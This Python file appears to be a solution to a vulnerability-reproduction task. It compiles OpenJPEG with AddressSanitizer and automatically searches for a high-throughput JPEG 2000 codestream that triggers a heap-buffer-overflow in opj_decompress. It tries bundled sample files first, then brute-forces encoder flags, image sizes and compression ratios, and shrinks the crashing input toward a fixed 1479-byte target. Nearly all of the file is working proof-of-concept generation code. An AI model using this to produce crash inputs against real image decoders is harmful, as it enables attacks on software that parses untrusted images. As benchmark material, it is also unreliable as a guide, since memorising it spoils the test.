import os
import re
import sys
import tarfile
import shutil
import struct
import tempfile
import subprocess
from pathlib import Path
from typing import Optional, Tuple, List


def _run(cmd: List[str], cwd: Optional[Path] = None, env: Optional[dict] = None, timeout: int = 120) -> subprocess.CompletedProcess:
    e = os.environ.copy()
    if env:
        e.update(env)
    return subprocess.run(
        cmd,
        cwd=str(cwd) if cwd else None,
        env=e,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        check=False,
    )


def _extract_tarball(src_path: str, out_dir: Path) -> Path:
    out_dir.mkdir(parents=True, exist_ok=True)
    with tarfile.open(src_path, "r:*") as tf:
        tf.extractall(out_dir)
    entries = [p for p in out_dir.iterdir() if p.name not in (".", "..")]
    if len(entries) == 1 and entries[0].is_dir():
        return entries[0]
    return out_dir


def _find_executable(root: Path, name: str) -> Optional[Path]:
    for p in root.rglob(name):
        try:
            if p.is_file() and os.access(p, os.X_OK):
                return p
        except OSError:
            continue
    if sys.platform.startswith("win"):
        for p in root.rglob(name + ".exe"):
            try:
                if p.is_file() and os.access(p, os.X_OK):
                    return p
            except OSError:
                continue
    return None


def _extract_codestream(data: bytes) -> Optional[bytes]:
    soc = data.find(b"\xff\x4f")
    if soc < 0:
        return None
    eoc = data.rfind(b"\xff\xd9")
    if eoc < 0 or eoc < soc:
        return None
    return data[soc : eoc + 2]


def _cod_has_ht_style(codestream: bytes) -> bool:
    soc = codestream.find(b"\xff\x4f")
    if soc < 0:
        return False
    i = soc + 2
    n = len(codestream)
    while i + 1 < n:
        if codestream[i] != 0xFF:
            i += 1
            continue
        while i < n and codestream[i] == 0xFF:
            i += 1
        if i >= n:
            break
        m = codestream[i]
        i += 1
        marker = (0xFF << 8) | m
        if marker == 0xFF93:  # SOD
            break
        if marker == 0xFFD9:  # EOC
            break
        if i + 1 >= n:
            break
        L = (codestream[i] << 8) | codestream[i + 1]
        i += 2
        if L < 2 or i + (L - 2) > n:
            break
        payload = codestream[i : i + (L - 2)]
        if marker == 0xFF52 and len(payload) >= 9:
            # payload layout: Scod(1) prog(1) nlayers(2) mct(1) ndecomp(1) cblk_w(1) cblk_h(1) cblk_style(1) ...
            cblk_style = payload[8]
            if (cblk_style & 0x40) != 0:
                return True
        i += (L - 2)
    return False


def _write_pgm(path: Path, w: int, h: int, value: int = 0) -> None:
    if w <= 0 or h <= 0 or w > 10000 or h > 10000:
        raise ValueError("bad dims")
    header = f"P5\n{w} {h}\n255\n".encode("ascii")
    path.write_bytes(header + bytes([value]) * (w * h))


def _encode_ht(
    opj_compress: Path,
    in_pgm: Path,
    out_path: Path,
    extra_args: List[str],
    w: int,
    h: int,
    cblk_w: int,
    cblk_h: int,
    num_res: int,
    ratio: Optional[int],
) -> Optional[bytes]:
    cmd = [str(opj_compress), "-i", str(in_pgm), "-o", str(out_path)]
    if num_res is not None:
        cmd += ["-n", str(num_res)]
    if cblk_w and cblk_h:
        cmd += ["-b", f"{cblk_w},{cblk_h}"]
    if w and h:
        cmd += ["-t", f"{w},{h}"]
    if ratio is not None:
        cmd += ["-r", str(ratio)]
    cmd += extra_args
    r = _run(cmd, timeout=120)
    if r.returncode != 0 or (not out_path.exists()) or out_path.stat().st_size == 0:
        return None
    raw = out_path.read_bytes()
    codestream = _extract_codestream(raw)
    return codestream


def _decode_check_crash(opj_decompress: Path, codestream: bytes, workdir: Path) -> Tuple[bool, str]:
    inp = workdir / "poc.j2k"
    outp = workdir / "out.pgm"
    inp.write_bytes(codestream)
    env = {
        "ASAN_OPTIONS": "abort_on_error=1:detect_leaks=0:halt_on_error=1",
        "UBSAN_OPTIONS": "halt_on_error=1:abort_on_error=1",
    }
    r = _run([str(opj_decompress), "-i", str(inp), "-o", str(outp)], env=env, timeout=60)
    stderr = (r.stderr or b"").decode("utf-8", "ignore")
    crashed = ("AddressSanitizer" in stderr) or ("heap-buffer-overflow" in stderr) or ("ERROR: AddressSanitizer" in stderr)
    return crashed, stderr


def _discover_ht_encoding_method(opj_compress: Path, tmp: Path) -> Optional[Tuple[str, List[str], str]]:
    # Returns (method_name, extra_args, out_ext)
    # method_name is informational.
    in_pgm = tmp / "tiny.pgm"
    _write_pgm(in_pgm, 1, 1, 0)

    # Try by output extension .jph without extra args
    out_jph = tmp / "tiny.jph"
    cs = _encode_ht(opj_compress, in_pgm, out_jph, [], 1, 1, 64, 64, 1, 1000)
    if cs and _cod_has_ht_style(cs):
        return ("ext_jph", [], ".jph")

    # Try common explicit flags with .j2k output
    out_j2k = tmp / "tiny.j2k"
    guesses = [
        (["-HT"], "flag_-HT"),
        (["-ht"], "flag_-ht"),
        (["-H"], "flag_-H"),
        (["-H", "1"], "flag_-H_1"),
        (["-H", "HT"], "flag_-H_HT"),
        (["-JPH"], "flag_-JPH"),
        (["-jph"], "flag_-jph"),
        (["-J"], "flag_-J"),
    ]
    for extra, name in guesses:
        if out_j2k.exists():
            try:
                out_j2k.unlink()
            except OSError:
                pass
        cs = _encode_ht(opj_compress, in_pgm, out_j2k, extra, 1, 1, 64, 64, 1, 1000)
        if cs and _cod_has_ht_style(cs):
            return (name, extra, ".j2k")

    # Parse help output to find any options mentioning HT/JPH
    r = _run([str(opj_compress), "-h"], timeout=30)
    help_txt = ((r.stdout or b"") + b"\n" + (r.stderr or b"")).decode("utf-8", "ignore")
    cand_opts: List[str] = []
    for line in help_txt.splitlines():
        u = line.upper()
        if "HT" in u or "JPH" in u or "HTJ2K" in u:
            m = re.match(r"^\s*(-{1,2}[A-Za-z0-9][A-Za-z0-9_-]*)\b", line)
            if m:
                cand_opts.append(m.group(1))
    cand_opts = list(dict.fromkeys(cand_opts))
    trial_args: List[List[str]] = []
    for opt in cand_opts:
        trial_args.append([opt])
        trial_args.append([opt, "1"])
        trial_args.append([opt, "true"])
        trial_args.append([opt, "on"])
        trial_args.append([opt, "HT"])
        trial_args.append([opt, "JPH"])

    for extra in trial_args:
        if out_j2k.exists():
            try:
                out_j2k.unlink()
            except OSError:
                pass
        cs = _encode_ht(opj_compress, in_pgm, out_j2k, extra, 1, 1, 64, 64, 1, 1000)
        if cs and _cod_has_ht_style(cs):
            return ("help_discovered", extra, ".j2k")

    return None


def _build_openjpeg_asan(src_root: Path, build_root: Path) -> Optional[Tuple[Path, Path]]:
    build_root.mkdir(parents=True, exist_ok=True)
    cmake = shutil.which("cmake")
    if not cmake:
        return None

    gen = []
    if shutil.which("ninja"):
        gen = ["-G", "Ninja"]

    cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined"
    ldflags = "-fsanitize=address,undefined"
    cfg_cmd = [
        cmake,
        str(src_root),
        *gen,
        "-DBUILD_CODEC=ON",
        "-DBUILD_SHARED_LIBS=OFF",
        "-DBUILD_TESTING=OFF",
        "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
        f"-DCMAKE_C_FLAGS={cflags}",
        f"-DCMAKE_CXX_FLAGS={cflags}",
        f"-DCMAKE_EXE_LINKER_FLAGS={ldflags}",
    ]
    r = _run(cfg_cmd, cwd=build_root, timeout=180)
    if r.returncode != 0:
        # Retry with fewer options
        cfg_cmd2 = [
            cmake,
            str(src_root),
            *gen,
            "-DBUILD_CODEC=ON",
            "-DBUILD_SHARED_LIBS=OFF",
            "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
            f"-DCMAKE_C_FLAGS={cflags}",
            f"-DCMAKE_CXX_FLAGS={cflags}",
            f"-DCMAKE_EXE_LINKER_FLAGS={ldflags}",
        ]
        r2 = _run(cfg_cmd2, cwd=build_root, timeout=180)
        if r2.returncode != 0:
            return None

    build_cmd = [cmake, "--build", str(build_root), "--target", "opj_compress", "opj_decompress", "-j", str(max(1, (os.cpu_count() or 8)))]
    r = _run(build_cmd, timeout=600)
    if r.returncode != 0:
        # Try without explicit targets
        r = _run([cmake, "--build", str(build_root), "-j", str(max(1, (os.cpu_count() or 8)))], timeout=600)
        if r.returncode != 0:
            return None

    opj_compress = _find_executable(build_root, "opj_compress")
    opj_decompress = _find_executable(build_root, "opj_decompress")
    if not opj_compress or not opj_decompress:
        return None
    return opj_compress, opj_decompress


def _try_existing_files_for_crash(opj_decompress: Path, src_root: Path, tmp: Path) -> Optional[bytes]:
    exts = {".j2k", ".j2c", ".jp2", ".jph"}
    candidates: List[Path] = []
    for p in src_root.rglob("*"):
        if p.is_file() and p.suffix.lower() in exts:
            try:
                if p.stat().st_size <= 2_000_000:
                    candidates.append(p)
            except OSError:
                continue
    candidates.sort(key=lambda x: x.stat().st_size if x.exists() else 10**18)

    best: Optional[bytes] = None
    for p in candidates[:200]:
        try:
            raw = p.read_bytes()
        except OSError:
            continue
        cs = _extract_codestream(raw)
        if not cs:
            continue
        if not _cod_has_ht_style(cs):
            continue
        crashed, _ = _decode_check_crash(opj_decompress, cs, tmp)
        if crashed:
            if best is None or len(cs) < len(best):
                best = cs
    return best


def _search_generated_crash(
    opj_compress: Path,
    opj_decompress: Path,
    tmp: Path,
    method_extra_args: List[str],
    method_out_ext: str,
) -> Optional[bytes]:
    in_pgm = tmp / "gen.pgm"
    out_file = tmp / ("gen" + method_out_ext)

    # Candidate parameters prioritized by small pixel count and edge codeblocks
    cblks = [(64, 64), (32, 32), (16, 16), (8, 8)]
    num_res_list = [1, 2, 3]
    ratios = [5000, 2000, 1000, 500, 200, 100, 50]

    dim_candidates: List[Tuple[int, int, int, int, int]] = []  # (w,h,cw,ch,num_res)
    for cw, ch in cblks:
        for num_res in num_res_list:
            # create edge blocks: +1, +2, +3, and very small height/width
            whs = [
                (cw + 1, 1),
                (cw + 1, 2),
                (cw + 1, 3),
                (cw + 1, 4),
                (1, ch + 1),
                (2, ch + 1),
                (3, ch + 1),
                (4, ch + 1),
                (cw + 1, ch),
                (cw, ch + 1),
                (cw + 1, ch + 1),
                (cw + 2, ch + 1),
                (cw + 1, ch + 2),
                (cw * 2 + 1, ch),
                (cw, ch * 2 + 1),
                (cw * 2 + 1, ch * 2 + 1),
            ]
            for w, h in whs:
                if 1 <= w <= 512 and 1 <= h <= 512:
                    dim_candidates.append((w, h, cw, ch, num_res))

    # sort by area and then by num_res
    dim_candidates = list(dict.fromkeys(dim_candidates))
    dim_candidates.sort(key=lambda t: (t[0] * t[1], t[4], t[2] * t[3]))

    best: Optional[bytes] = None
    best_params = None

    for (w, h, cw, ch, num_res) in dim_candidates[:120]:
        try:
            _write_pgm(in_pgm, w, h, 0)
        except Exception:
            continue

        for ratio in ratios:
            try:
                if out_file.exists():
                    out_file.unlink()
            except OSError:
                pass

            cs = _encode_ht(opj_compress, in_pgm, out_file, method_extra_args, w, h, cw, ch, num_res, ratio)
            if not cs:
                continue
            if not _cod_has_ht_style(cs):
                continue

            crashed, _ = _decode_check_crash(opj_decompress, cs, tmp)
            if crashed:
                if best is None or len(cs) < len(best):
                    best = cs
                    best_params = (w, h, cw, ch, num_res, ratio)
                break  # don't try lower compression ratios if already crashing

        if best is not None and len(best) <= 1479:
            return best

    # Refinement: if found crash, try shrink further by increasing compression ratio and reducing dimensions slightly around found params
    if best is not None and best_params is not None:
        w0, h0, cw0, ch0, num_res0, ratio0 = best_params
        refine_dims = []
        for dw in [0, -1, -2, -3]:
            for dh in [0, -1, -2, -3]:
                w = max(1, w0 + dw)
                h = max(1, h0 + dh)
                refine_dims.append((w, h))
        refine_dims = list(dict.fromkeys(refine_dims))
        refine_dims.sort(key=lambda x: x[0] * x[1])

        refine_ratios = [10000, 8000, 5000, 3000, 2000, 1500, 1000]
        for (w, h) in refine_dims:
            try:
                _write_pgm(in_pgm, w, h, 0)
            except Exception:
                continue
            for ratio in refine_ratios:
                try:
                    if out_file.exists():
                        out_file.unlink()
                except OSError:
                    pass
                cs = _encode_ht(opj_compress, in_pgm, out_file, method_extra_args, w, h, cw0, ch0, num_res0, ratio)
                if not cs or not _cod_has_ht_style(cs):
                    continue
                crashed, _ = _decode_check_crash(opj_decompress, cs, tmp)
                if crashed and len(cs) < len(best):
                    best = cs
                    if len(best) <= 1479:
                        return best
                    break

    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            td_path = Path(td)
            src_dir = td_path / "src"
            build_dir = td_path / "build"
            work_dir = td_path / "work"
            work_dir.mkdir(parents=True, exist_ok=True)

            root = _extract_tarball(src_path, src_dir)

            tools = _build_openjpeg_asan(root, build_dir)
            if not tools:
                # Minimal invalid fallback (should not happen in expected environment)
                return b"\xff\x4f\xff\xd9"
            opj_compress, opj_decompress = tools

            # Try any included repro/corpus files first
            existing = _try_existing_files_for_crash(opj_decompress, root, work_dir)
            if existing:
                return existing

            method = _discover_ht_encoding_method(opj_compress, work_dir)
            if not method:
                # Fallback minimal J2K codestream markers (won't be HT)
                return b"\xff\x4f\xff\xd9"
            _, extra_args, out_ext = method

            best = _search_generated_crash(opj_compress, opj_decompress, work_dir, extra_args, out_ext)
            if best:
                return best

            # If no crash found, at least return a small HT codestream
            in_pgm = work_dir / "fallback.pgm"
            _write_pgm(in_pgm, 1, 1, 0)
            out_file = work_dir / ("fallback" + out_ext)
            cs = _encode_ht(opj_compress, in_pgm, out_file, extra_args, 1, 1, 64, 64, 1, 1000)
            if cs:
                return cs
            return b"\xff\x4f\xff\xd9"